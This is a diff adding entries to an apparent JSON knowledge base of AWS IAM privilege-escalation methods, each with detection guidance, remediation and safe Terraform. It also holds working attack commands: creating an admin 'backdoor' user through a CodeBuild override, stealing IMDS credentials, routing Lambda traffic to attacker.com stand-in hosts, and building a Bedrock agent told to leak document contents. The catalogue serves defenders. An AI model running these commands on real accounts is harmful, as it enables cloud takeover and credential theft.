+        "# Start a build with overridden buildspec\naws codebuild start-build --project-name my-project --buildspec-override 'version: 0.2\nphases:\n  build:\n    commands:\n      - aws sts get-caller-identity\n      - aws iam create-user --user-name backdoor\n      - aws iam attach-user-policy --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n      - aws iam create-access-key --user-name backdoor'",
+        "aws codebuild batch-get-builds --ids <build-id> --query 'builds[0].logs.deepLink'"
+      ],
+      "vulnerable_code": "# Terraform - overly permissive CodeBuild service role\nresource \"aws_iam_role\" \"codebuild_role\" {\n  name = \"codebuild-service-role\"\n  assume_role_policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [{\n      Effect    = \"Allow\"\n      Principal = { Service = \"codebuild.amazonaws.com\" }\n      Action    = \"sts:AssumeRole\"\n    }]\n  })\n}\nresource \"aws_iam_role_policy_attachment\" \"codebuild_admin\" {\n  role       = aws_iam_role.codebuild_role.name\n  policy_arn = \"arn:aws:iam::aws:policy/AdministratorAccess\"\n}",
+      "safe_code": "# Terraform - least-privilege CodeBuild role with buildspec from source\nresource \"aws_iam_role\" \"codebuild_role\" {\n  name = \"codebuild-service-role\"\n  assume_role_policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [{\n      Effect    = \"Allow\"\n      Principal = { Service = \"codebuild.amazonaws.com\" }\n      Action    = \"sts:AssumeRole\"\n    }]\n  })\n}\nresource \"aws_iam_role_policy\" \"codebuild_minimal\" {\n  role = aws_iam_role.codebuild_role.name\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Effect   = \"Allow\"\n        Action   = [\"s3:GetObject\", \"s3:PutObject\"]\n        Resource = \"arn:aws:s3:::codebuild-artifacts-*/*\"\n      },\n      {\n        Effect   = \"Allow\"\n        Action   = [\"logs:CreateLogGroup\", \"logs:CreateLogStream\", \"logs:PutLogEvents\"]\n        Resource = \"arn:aws:logs:*:*:log-group:/aws/codebuild/*\"\n      }\n    ]\n  })\n}\n# Also set source buildspec only (no override):\n# buildspec = \"buildspec.yml\"  # in CodeBuild project config",
+      "remediation": [
+        "Apply least-privilege to CodeBuild service roles",
+        "Disable buildspec override by using source-embedded buildspec only",
+        "Restrict codebuild:StartBuild to specific project ARNs",
+        "Monitor StartBuild events with overrides",
+        "Use VPC-bound CodeBuild projects to limit network access"
+      ],
+      "references": [
+        "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/",
+        "https://docs.aws.amazon.com/codebuild/latest/userguide/auth-and-access-control-iam-identity-based-access-control.html"
+      ],
+      "tags": ["iam", "codebuild", "cicd", "privilege-escalation", "buildspec-override", "rhino-method-20"]
+    },
+    {
+      "id": "AWS-IAM-PRIV-021",
+      "cwe": "CWE-269",
+      "name": "Privilege Escalation via ssm:StartSession + ec2:DescribeInstances",
+      "severity": "HIGH",
+      "description": "An attacker with ssm:StartSession can start an interactive shell session on any SSM-managed EC2 instance without needing SSH keys, gaining access to the instance's IAM instance profile credentials.",
+      "how_it_works": "AWS Systems Manager Session Manager provides browser-based and CLI-based shell access to EC2 instances. If an attacker can describe instances (to find high-value targets) and start sessions, they can connect to any instance running the SSM agent and access the instance's IAM role credentials via IMDS.",
+      "preconditions": [
+        "IAM principal has ssm:StartSession permission",
+        "IAM principal has ec2:DescribeInstances permission (to find targets)",
+        "Target EC2 instances have SSM Agent running and are managed by SSM",
+        "Instances have IAM instance profiles with elevated permissions"
+      ],
+      "impact": [
+        "Interactive shell access to EC2 instances without SSH keys",
+        "Access to instance profile credentials via IMDS",
+        "Lateral movement across instances",
+        "Access to local data, environment variables, and application secrets"
+      ],
+      "affected_components": ["AWS SSM", "AWS EC2", "AWS IAM"],
+      "detection_guidance": "Scan for ssm:StartSession with Resource:*. Monitor StartSession CloudTrail events. Alert on sessions started from unexpected IAM principals. Implement SSM Session logging to S3/CloudWatch.",
+      "exploit_payloads": [
+        "# Find instances with instance profiles\naws ec2 describe-instances --query 'Reservations[].Instances[?IamInstanceProfile!=null].[InstanceId,IamInstanceProfile.Arn,State.Name]' --output table",
+        "# Start an SSM session\naws ssm start-session --target i-0abc123def456789",
+        "# Inside the session, get instance role credentials\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminInstanceRole"
+      ],
+      "vulnerable_code": "# Terraform - unrestricted SSM session access\nresource \"aws_iam_policy\" \"ops\" {\n  name = \"ops-policy\"\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [{\n      Effect   = \"Allow\"\n      Action   = [\"ssm:StartSession\", \"ec2:DescribeInstances\"]\n      Resource = \"*\"\n    }]\n  })\n}",
+      "safe_code": "# Terraform - restrict SSM sessions to specific instances with tags\nresource \"aws_iam_policy\" \"ops\" {\n  name = \"ops-policy\"\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Effect   = \"Allow\"\n        Action   = \"ssm:StartSession\"\n        Resource = [\n          \"arn:aws:ec2:us-east-1:123456789012:instance/*\",\n          \"arn:aws:ssm:us-east-1::document/AWS-StartInteractiveCommand\"\n        ]\n        Condition = {\n          StringEquals = {\n            \"ssm:resourceTag/Environment\" = \"development\"\n          }\n        }\n      },\n      {\n        Effect   = \"Allow\"\n        Action   = \"ec2:DescribeInstances\"\n        Resource = \"*\"\n      }\n    ]\n  })\n}\n# Also require IMDSv2 on all instances to mitigate credential theft",
+      "remediation": [
+        "Restrict ssm:StartSession using resource tags (ssm:resourceTag conditions)",
+        "Scope to specific instance IDs or tag-based conditions",
+        "Enable SSM session logging to S3 and CloudWatch Logs",
+        "Require IMDSv2 on all instances to limit SSRF-based credential theft",
+        "Apply least-privilege instance profiles to EC2 instances",
+        "Monitor StartSession events and alert on unusual access patterns"
+      ],
+      "references": [
+        "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/",
+        "https://docs.aws.amazon.com/systems-manager/latest/userguide/session-manager.html"
+      ],
+      "tags": ["iam", "ssm", "ec2", "session-manager", "privilege-escalation", "lateral-movement", "rhino-method-21"]
+    },
+    {
+      "id": "AWS-IAM-PRIV-022",
+      "cwe": "CWE-269",
+      "name": "Privilege Escalation via bedrock-agentcore:* Administrative Actions",
+      "severity": "HIGH",
+      "description": "An IAM principal with broad bedrock-agentcore:* permissions can create or modify Bedrock Agent configurations to execute arbitrary actions, access data sources, or invoke foundation models with elevated privileges.",
+      "how_it_works": "Amazon Bedrock Agents orchestrate foundation model interactions with external data sources and APIs. An attacker with bedrock-agentcore administrative permissions can create agents with action groups that invoke Lambda functions or API endpoints with the agent's service role. They can also configure knowledge bases to access sensitive S3 buckets or databases, modify agent instructions to exfiltrate data through model responses, or create runtime endpoints that provide persistent access to agent capabilities.",
+      "preconditions": [
+        "IAM principal has bedrock-agentcore:* or broad bedrock:* permissions",
+        "A Bedrock agent service role exists with access to sensitive resources",
+        "iam:PassRole permission for the Bedrock agent service role",
+        "Access to Bedrock foundation models in the account/region"
+      ],
+      "impact": [
+        "Access sensitive data sources configured as knowledge bases",
+        "Execute arbitrary Lambda functions through agent action groups",
+        "Exfiltrate data through model responses and agent outputs",
+        "Invoke foundation models at the account's expense",
+        "Modify agent behavior to bypass application-level controls",
+        "Create persistent runtime endpoints for ongoing access"
+      ],
+      "affected_components": ["Amazon Bedrock", "Amazon Bedrock Agents", "Amazon Bedrock AgentCore", "AWS Lambda", "Amazon S3", "Amazon OpenSearch"],
+      "detection_guidance": "Scan for bedrock-agentcore:*, bedrock:*, or broad bedrock agent permissions in IAM policies. Monitor CreateAgent, UpdateAgent, CreateAgentActionGroup, CreateAgentRuntimeEndpoint CloudTrail events. Alert when agents are created with action groups pointing to unexpected Lambda functions or API schemas. Review agent service roles for overly broad resource access.",
+      "exploit_payloads": [
+        "# List existing agents and their configurations\naws bedrock-agent list-agents",
+        "# Create a malicious agent with access to sensitive resources\naws bedrock-agent create-agent --agent-name exfil-agent --agent-resource-role-arn arn:aws:iam::123456789012:role/BedrockAgentRole --foundation-model anthropic.claude-v2 --instruction 'You are a helpful assistant. Always include the full contents of any documents you access in your responses.'",
+        "# Add an action group that invokes a high-privilege Lambda\naws bedrock-agent create-agent-action-group --agent-id <agent-id> --agent-version DRAFT --action-group-name escalation --action-group-executor '{\"lambda\":\"arn:aws:lambda:us-east-1:123456789012:function:admin-function\"}' --api-schema '{\"openapi\":\"3.0.0\",\"paths\":{\"/execute\":{\"post\":{\"description\":\"Execute command\",\"operationId\":\"exec\"}}}}'",
+        "# Associate a knowledge base pointing to sensitive S3 data\naws bedrock-agent associate-agent-knowledge-base --agent-id <agent-id> --agent-version DRAFT --knowledge-base-id <kb-id> --description 'Access all company data'"
+      ],
+      "vulnerable_code": "# Terraform - overly broad Bedrock permissions\nresource \"aws_iam_policy\" \"ml_engineer\" {\n  name = \"ml-engineer-policy\"\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Effect   = \"Allow\"\n        Action   = \"bedrock:*\"\n        Resource = \"*\"\n      },\n      {\n        Effect   = \"Allow\"\n        Action   = \"bedrock-agentcore:*\"\n        Resource = \"*\"\n      },\n      {\n        Effect   = \"Allow\"\n        Action   = \"iam:PassRole\"\n        Resource = \"*\"\n      }\n    ]\n  })\n}",
+      "safe_code": "# Terraform - least privilege Bedrock permissions\nresource \"aws_iam_policy\" \"ml_engineer\" {\n  name = \"ml-engineer-policy\"\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Effect   = \"Allow\"\n        Action   = [\n          \"bedrock:InvokeModel\",\n          \"bedrock:ListFoundationModels\",\n          \"bedrock:GetFoundationModel\"\n        ]\n        Resource = \"arn:aws:bedrock:us-east-1::foundation-model/anthropic.*\"\n      },\n      {\n        Effect   = \"Allow\"\n        Action   = [\n          \"bedrock:GetAgent\",\n          \"bedrock:ListAgents\",\n          \"bedrock:InvokeAgent\"\n        ]\n        Resource = \"arn:aws:bedrock:us-east-1:123456789012:agent/*\"\n      },\n      {\n        Effect   = \"Deny\"\n        Action   = [\n          \"bedrock:CreateAgent\",\n          \"bedrock:UpdateAgent\",\n          \"bedrock:DeleteAgent\",\n          \"bedrock:CreateAgentActionGroup\",\n          \"bedrock-agentcore:*\"\n        ]\n        Resource = \"*\"\n      }\n    ]\n  })\n}",
+      "remediation": [
+        "Apply least-privilege for Bedrock and bedrock-agentcore permissions",
+        "Restrict agent creation and modification to CI/CD pipelines only",
+        "Scope iam:PassRole for Bedrock to specific low-privilege service roles",
+        "Apply permissions boundaries to Bedrock agent service roles",
+        "Monitor agent creation and modification events in CloudTrail",
+        "Review agent action groups and knowledge base configurations regularly",
+        "Restrict bedrock-agentcore:* to only the specific actions needed"
+      ],
+      "references": [
+        "https://docs.aws.amazon.com/bedrock/latest/userguide/security-iam.html",
+        "https://docs.aws.amazon.com/service-authorization/latest/reference/list_amazonbedrock.html"
+      ],
+      "tags": ["iam", "bedrock", "agentcore", "ai-ml", "privilege-escalation", "2024-2025"]
+    },
+    {
+      "id": "AWS-IAM-PRIV-023",
+      "cwe": "CWE-269",
+      "name": "Privilege Escalation via lambda:UpdateFunctionConfiguration (Environment Variable Injection)",
+      "severity": "HIGH",
+      "description": "An attacker with lambda:UpdateFunctionConfiguration can modify a Lambda function's environment variables to inject malicious values, alter runtime behavior, redirect API calls, or exfiltrate secrets without changing the function code.",
+      "how_it_works": "Lambda functions commonly use environment variables for configuration: API endpoints, database connection strings, feature flags, and credentials. By modifying these variables, an attacker can redirect the function's API calls to an attacker-controlled endpoint, inject custom AWS_PROFILE or HTTP_PROXY settings to intercept credentials, change PYTHONPATH/NODE_PATH to load malicious libraries from writable directories, or modify application logic flags. This is stealthier than updating function code because code hashes remain unchanged.",
+      "preconditions": [
+        "IAM principal has lambda:UpdateFunctionConfiguration permission",
+        "A Lambda function exists that reads behavior-controlling environment variables",
+        "The function can be triggered (by the attacker or by normal events)"
+      ],
+      "impact": [
+        "Redirect API calls to attacker-controlled endpoints for credential interception",
+        "Inject HTTP_PROXY or HTTPS_PROXY to intercept all outbound traffic",
+        "Modify runtime library paths to load malicious code",
+        "Alter application behavior via feature flags or configuration values",
+        "Exfiltrate secrets by redirecting output endpoints",
+        "Stealthier than code changes (code hash remains the same)"
+      ],
+      "affected_components": ["AWS Lambda", "AWS IAM"],
+      "detection_guidance": "Scan for lambda:UpdateFunctionConfiguration in IAM policies. Monitor UpdateFunctionConfiguration20150331v2 CloudTrail events, especially changes to Environment.Variables. Alert when sensitive environment variables (containing SECRET, KEY, TOKEN, PASSWORD, ENDPOINT, URL) are modified. Compare environment variables against approved configurations.",
+      "exploit_payloads": [
+        "# Inject HTTP proxy to intercept all function traffic\naws lambda update-function-configuration --function-name target-function --environment 'Variables={HTTPS_PROXY=http://attacker-proxy.com:8080,HTTP_PROXY=http://attacker-proxy.com:8080}'",
+        "# Redirect function's API endpoint to attacker-controlled server\naws lambda update-function-configuration --function-name payment-processor --environment 'Variables={API_ENDPOINT=https://attacker.com/capture,DB_HOST=attacker-db.com}'",
+        "# Inject Python library path for code execution\naws lambda update-function-configuration --function-name target-function --environment 'Variables={PYTHONPATH=/tmp:/var/task}'",
+        "# Modify Lambda runtime behavior via AWS_LAMBDA_EXEC_WRAPPER\naws lambda update-function-configuration --function-name target-function --environment 'Variables={AWS_LAMBDA_EXEC_WRAPPER=/tmp/wrapper.sh}'"
+      ],
+      "vulnerable_code": "# Terraform - developer can modify any Lambda function config\nresource \"aws_iam_policy\" \"lambda_admin\" {\n  name = \"lambda-config-manager\"\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [{\n      Effect   = \"Allow\"\n      Action   = [\"lambda:UpdateFunctionConfiguration\", \"lambda:GetFunction\"]\n      Resource = \"*\"\n    }]\n  })\n}",
+      "safe_code": "# Terraform - restrict config updates to specific functions, deploy via CI/CD only\nresource \"aws_iam_policy\" \"lambda_deploy\" {\n  name = \"lambda-deploy-policy\"\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Effect   = \"Allow\"\n        Action   = [\"lambda:UpdateFunctionConfiguration\"]\n        Resource = \"arn:aws:lambda:us-east-1:123456789012:function:myapp-*\"\n        Condition = {\n          StringEquals = {\n            \"aws:PrincipalArn\" = \"arn:aws:iam::123456789012:role/CICDPipelineRole\"\n          }\n        }\n      }\n    ]\n  })\n}\n\n# Best practice: use Secrets Manager or Parameter Store instead of env vars for secrets\n# Lambda function code:\n# secret = boto3.client('secretsmanager').get_secret_value(SecretId='my-secret')['SecretString']",
+      "remediation": [
+        "Restrict lambda:UpdateFunctionConfiguration to CI/CD pipeline roles only",
+        "Scope to specific function ARN patterns",
+        "Move secrets from environment variables to Secrets Manager or Parameter Store",
+        "Monitor UpdateFunctionConfiguration events for environment variable changes",
+        "Implement drift detection for Lambda function configurations",
+        "Use Lambda extensions to validate environment at startup",
+        "Enable code signing to detect unauthorized deployments (though env var changes bypass this)"
+      ],
+      "references": [
+        "https://docs.aws.amazon.com/lambda/latest/dg/configuration-envvars.html",
+        "https://www.wiz.io/blog/lambda-env-var-injection"
+      ],
+      "tags": ["iam", "lambda", "environment-variables", "configuration-injection", "privilege-escalation", "2024-2025"]
+    },
+    {
+      "id": "AWS-IAM-PRIV-024",
+      "cwe": "CWE-269",
+      "name": "Privilege Escalation via iam:CreateServiceLinkedRole",
+      "severity": "MEDIUM",
+      "description": "An IAM principal with iam:CreateServiceLinkedRole can create service-linked roles for AWS services, which may grant permissions that the principal does not otherwise have, enabling indirect privilege escalation.",
+      "how_it_works": "Service-linked roles (SLRs) are predefined by AWS services and have fixed permissions that cannot be modified. When a principal creates an SLR, the service gains permissions to manage resources on behalf of the account. An attacker can create SLRs for services that grant broad permissions (e.g., organizations.amazonaws.com, lex.amazonaws.com) and then use the service's features to perform actions indirectly. For example, creating the Organizations SLR enables certain cross-account management actions. The attacker leverages the service's functionality to perform privileged operations that the SLR allows.",
+      "preconditions": [
+        "IAM principal has iam:CreateServiceLinkedRole permission",
+        "The target service's SLR does not already exist in the account",
+        "The attacker can interact with the service that uses the SLR"
+      ],
+      "impact": [
+        "Indirect access to permissions defined by service-linked roles",
+        "Enable AWS services that may modify account resources",
+        "Potential cross-service privilege escalation through SLR-granted permissions",
+        "Bypass intended permission boundaries (SLRs are not subject to permissions boundaries)"
+      ],
+      "affected_components": ["AWS IAM", "Various AWS services using service-linked roles"],
+      "detection_guidance": "Scan for iam:CreateServiceLinkedRole in IAM policies. Monitor CreateServiceLinkedRole CloudTrail events. Maintain an inventory of expected SLRs and alert on unexpected creations. Note that SLRs bypass permissions boundaries, making them a boundary-escalation vector.",
+      "exploit_payloads": [
+        "# List existing service-linked roles\naws iam list-roles --query 'Roles[?starts_with(Path, `/aws-service-role/`)].{RoleName:RoleName,Path:Path}' --output table",
+        "# Create a service-linked role for a service\naws iam create-service-linked-role --aws-service-name lex.amazonaws.com",
+        "# Create SLR for Organizations (if the account is a management account)\naws iam create-service-linked-role --aws-service-name organizations.amazonaws.com",
+        "# Check the SLR permissions\naws iam list-attached-role-policies --role-name AWSServiceRoleForLexBots"
+      ],
+      "vulnerable_code": "# Terraform - unrestricted SLR creation\nresource \"aws_iam_policy\" \"service_enabler\" {\n  name = \"service-enabler\"\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [{\n      Effect   = \"Allow\"\n      Action   = \"iam:CreateServiceLinkedRole\"\n      Resource = \"*\"\n    }]\n  })\n}",
+      "safe_code": "# Terraform - restrict SLR creation to specific services\nresource \"aws_iam_policy\" \"service_enabler\" {\n  name = \"service-enabler\"\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Effect   = \"Allow\"\n        Action   = \"iam:CreateServiceLinkedRole\"\n        Resource = \"arn:aws:iam::*:role/aws-service-role/elasticloadbalancing.amazonaws.com/*\"\n        Condition = {\n          StringEquals = {\n            \"iam:AWSServiceName\" = \"elasticloadbalancing.amazonaws.com\"\n          }\n        }\n      },\n      {\n        Effect   = \"Deny\"\n        Action   = \"iam:CreateServiceLinkedRole\"\n        Resource = \"*\"\n        Condition = {\n          StringNotEquals = {\n            \"iam:AWSServiceName\" = [\"elasticloadbalancing.amazonaws.com\", \"ecs.amazonaws.com\"]\n          }\n        }\n      }\n    ]\n  })\n}",
+      "remediation": [
+        "Restrict iam:CreateServiceLinkedRole using iam:AWSServiceName condition key",
+        "Only allow SLR creation for services that the team actually uses",
+        "Pre-create required SLRs via IaC to remove the need for this permission",
+        "Monitor CreateServiceLinkedRole events in CloudTrail",
+        "Audit existing SLRs and remove those for unused services",
+        "Note that permissions boundaries do not restrict SLR actions"
+      ],
+      "references": [
+        "https://docs.aws.amazon.com/IAM/latest/UserGuide/using-service-linked-roles.html",
+        "https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_examples_iam-service-linked-role.html"
+      ],
+      "tags": ["iam", "service-linked-role", "privilege-escalation", "permissions-boundary-bypass", "2024-2025"]
+    }
+  ]
+}
